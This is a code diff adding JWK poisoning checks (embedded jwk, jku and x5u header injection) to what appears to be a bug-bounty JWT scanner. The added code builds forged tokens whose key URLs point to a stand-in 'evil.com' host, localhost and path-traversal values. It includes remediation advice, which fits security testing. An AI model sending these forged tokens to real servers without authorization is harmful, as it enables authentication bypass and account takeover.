@@ -446,6 +446,8 @@ class JWTScanner(ScanModule):
                 await self._test_kid_injection(target, token)
                 await self._test_claim_tampering(target, token)
                 await self._test_expiration_bypass(target, token)
+                # HIGH VALUE: JWK Poisoning Attacks ($5k-$20k bounties)
+                await self._test_jwk_poisoning(target, token)
 
         logger.info(f"[JWT Scanner] Scan complete. Found {len(self.findings)} vulnerabilities")
 
@@ -821,6 +823,222 @@ class JWTScanner(ScanModule):
                 target=target,
             )
 
+    async def _test_jwk_poisoning(self, target: str, token: JWTToken) -> None:
+        """
+        Test for JWK poisoning attacks (HIGH VALUE - $5k-$20k bounties).
+
+        This tests three critical JWK attack vectors:
+        1. Embedded JWK Attack - Inject our public key in 'jwk' header
+        2. JKU Injection - Redirect 'jku' URL to attacker-controlled server
+        3. X5U Injection - Redirect 'x5u' URL to attacker certificate
+
+        These attacks allow complete authentication bypass if vulnerable.
+        """
+        import secrets
+
+        alg = token.get_algorithm()
+
+        # Only applicable to RS/ES algorithms (asymmetric)
+        if not any(alg.startswith(prefix) for prefix in ["RS", "ES", "PS"]):
+            return
+
+        logger.debug(f"[JWT Scanner] Testing JWK poisoning attacks on {alg} token")
+
+        # ==================================================================
+        # ATTACK 1: Embedded JWK Attack
+        # Inject attacker's public key directly in the JWT header
+        # ==================================================================
+        try:
+            embedded_token = self._create_embedded_jwk_token(token)
+            if embedded_token and await self._test_token_accepted(target, embedded_token, token):
+                self._add_finding(
+                    title="JWT Embedded JWK Attack - Authentication Bypass",
+                    severity="critical",
+                    vulnerability=JWTVulnerability(
+                        attack_type=JWTAttackType.EMBEDDED_JWK,
+                        severity="critical",
+                        description="Server accepts tokens with embedded JWK public key in header. "
+                                   "Attacker can forge any JWT by including their own signing key. "
+                                   "This is a CRITICAL vulnerability allowing complete authentication bypass.",
+                        token_location=token.location,
+                        original_token=token.raw,
+                        manipulated_token=embedded_token,
+                        evidence="Token with attacker's embedded JWK was accepted",
+                        remediation="Never trust 'jwk' header in JWT. "
+                                   "Always use pre-configured keys from a trusted key store. "
+                                   "Remove jwk header processing from JWT validation.",
+                        cwe="CWE-347",  # Improper Verification of Cryptographic Signature
+                        cvss_score=9.8,
+                    ),
+                    target=target,
+                )
+                logger.warning(f"[JWT Scanner] CRITICAL: Embedded JWK attack successful!")
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] Embedded JWK test error: {e}")
+
+        # ==================================================================
+        # ATTACK 2: JKU (JWK Set URL) Injection
+        # Redirect jku to attacker-controlled URL serving our public key
+        # ==================================================================
+        try:
+            # Test with common attacker-controlled URL patterns
+            jku_test_urls = [
+                f"https://evil.com/{secrets.token_hex(8)}/jwks.json",
+                "https://localhost/.well-known/jwks.json",
+                "http://127.0.0.1/jwks.json",
+                # URL parameter pollution
+                f"{target}/.well-known/jwks.json?callback=evil",
+                # Same domain confusion
+                f"{target}/../../../evil/jwks.json",
+            ]
+
+            for jku_url in jku_test_urls[:2]:  # Limit to avoid noise
+                jku_token = self._create_jku_injection_token(token, jku_url)
+                if jku_token and await self._test_token_accepted(target, jku_token, token):
+                    self._add_finding(
+                        title="JWT JKU Injection - Key URL Redirect",
+                        severity="critical",
+                        vulnerability=JWTVulnerability(
+                            attack_type=JWTAttackType.JKU_INJECTION,
+                            severity="critical",
+                            description=f"Server accepts tokens with manipulated 'jku' header pointing to {jku_url}. "
+                                       "Attacker can redirect key fetching to their server and forge tokens.",
+                            token_location=token.location,
+                            original_token=token.raw,
+                            manipulated_token=jku_token,
+                            evidence=f"Token with jku={jku_url} was accepted",
+                            remediation="Validate jku URLs against an allowlist of trusted key providers. "
+                                       "Never fetch keys from arbitrary URLs specified in the token.",
+                            cwe="CWE-346",  # Origin Validation Error
+                            cvss_score=9.5,
+                        ),
+                        target=target,
+                    )
+                    logger.warning(f"[JWT Scanner] CRITICAL: JKU injection successful with {jku_url}")
+                    break
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] JKU injection test error: {e}")
+
+        # ==================================================================
+        # ATTACK 3: X5U (X.509 URL) Injection
+        # Redirect x5u to attacker-controlled certificate URL
+        # ==================================================================
+        try:
+            x5u_test_urls = [
+                f"https://evil.com/{secrets.token_hex(8)}/cert.pem",
+                "https://localhost/cert.pem",
+                f"{target}/../../../evil/cert.pem",
+            ]
+
+            for x5u_url in x5u_test_urls[:2]:
+                x5u_token = self._create_x5u_injection_token(token, x5u_url)
+                if x5u_token and await self._test_token_accepted(target, x5u_token, token):
+                    self._add_finding(
+                        title="JWT X5U Injection - Certificate URL Redirect",
+                        severity="critical",
+                        vulnerability=JWTVulnerability(
+                            attack_type=JWTAttackType.X5U_INJECTION,
+                            severity="critical",
+                            description=f"Server accepts tokens with manipulated 'x5u' header pointing to {x5u_url}. "
+                                       "Attacker can redirect certificate fetching to their server.",
+                            token_location=token.location,
+                            original_token=token.raw,
+                            manipulated_token=x5u_token,
+                            evidence=f"Token with x5u={x5u_url} was accepted",
+                            remediation="Validate x5u URLs against an allowlist. "
+                                       "Use certificate pinning instead of URL-based certificate fetching.",
+                            cwe="CWE-346",
+                            cvss_score=9.5,
+                        ),
+                        target=target,
+                    )
+                    logger.warning(f"[JWT Scanner] CRITICAL: X5U injection successful with {x5u_url}")
+                    break
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] X5U injection test error: {e}")
+
+    def _create_embedded_jwk_token(self, token: JWTToken) -> str | None:
+        """Create a token with embedded JWK containing attacker's key."""
+        try:
+            # Generate a simple RSA-like test key (for detection purposes)
+            # In real attack, this would be a proper RSA key
+            fake_jwk = {
+                "kty": "RSA",
+                "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
+                "e": "AQAB",
+                "alg": "RS256",
+                "use": "sig"
+            }
+
+            # Create new header with embedded JWK
+            new_header = token.header.copy()
+            new_header["jwk"] = fake_jwk
+            new_header["alg"] = "RS256"
+
+            # Create token with modified header (unsigned - tests if server validates)
+            header_b64 = base64.urlsafe_b64encode(
+                json.dumps(new_header).encode()
+            ).decode().rstrip("=")
+
+            payload_b64 = base64.urlsafe_b64encode(
+                json.dumps(token.payload).encode()
+            ).decode().rstrip("=")
+
+            # Fake signature (server should reject if properly validating)
+            fake_sig = base64.urlsafe_b64encode(b"fake_signature_for_detection").decode().rstrip("=")
+
+            return f"{header_b64}.{payload_b64}.{fake_sig}"
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] Error creating embedded JWK token: {e}")
+            return None
+
+    def _create_jku_injection_token(self, token: JWTToken, jku_url: str) -> str | None:
+        """Create a token with injected jku (JWK Set URL) header."""
+        try:
+            new_header = token.header.copy()
+            new_header["jku"] = jku_url
+
+            header_b64 = base64.urlsafe_b64encode(
+                json.dumps(new_header).encode()
+            ).decode().rstrip("=")
+
+            payload_b64 = base64.urlsafe_b64encode(
+                json.dumps(token.payload).encode()
+            ).decode().rstrip("=")
+
+            # Keep original signature (to test if server even checks jku)
+            original_parts = token.raw.split(".")
+            if len(original_parts) == 3:
+                return f"{header_b64}.{payload_b64}.{original_parts[2]}"
+
+            return None
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] Error creating JKU injection token: {e}")
+            return None
+
+    def _create_x5u_injection_token(self, token: JWTToken, x5u_url: str) -> str | None:
+        """Create a token with injected x5u (X.509 URL) header."""
+        try:
+            new_header = token.header.copy()
+            new_header["x5u"] = x5u_url
+
+            header_b64 = base64.urlsafe_b64encode(
+                json.dumps(new_header).encode()
+            ).decode().rstrip("=")
+
+            payload_b64 = base64.urlsafe_b64encode(
+                json.dumps(token.payload).encode()
+            ).decode().rstrip("=")
+
+            original_parts = token.raw.split(".")
+            if len(original_parts) == 3:
+                return f"{header_b64}.{payload_b64}.{original_parts[2]}"
+
+            return None
+        except Exception as e:
+            logger.debug(f"[JWT Scanner] Error creating X5U injection token: {e}")
+            return None
+
     async def _test_token_accepted(
         self,
         target: str,
@@ -865,6 +1083,16 @@ class JWTScanner(ScanModule):
         target: str,
     ) -> None:
         """Add a finding to the results."""
+        # Determine confidence based on severity
+        severity_confidence_map = {
+            "critical": 95,
+            "high": 90,
+            "medium": 85,
+            "low": 80,
+            "info": 100,
+        }
+        confidence = severity_confidence_map.get(severity.lower(), 85)
+        
         finding = Finding(
             name=title,  # Finding uses 'name' not 'title'
             type="jwt_vulnerability",
@@ -876,6 +1104,7 @@ class JWTScanner(ScanModule):
             remediation=vulnerability.remediation,
             cwe=vulnerability.cwe,
             cvss_score=vulnerability.cvss_score,
+            confidence=confidence,
             metadata={
                 "module": self.MODULE_NAME,
                 "attack_type": vulnerability.attack_type.value,
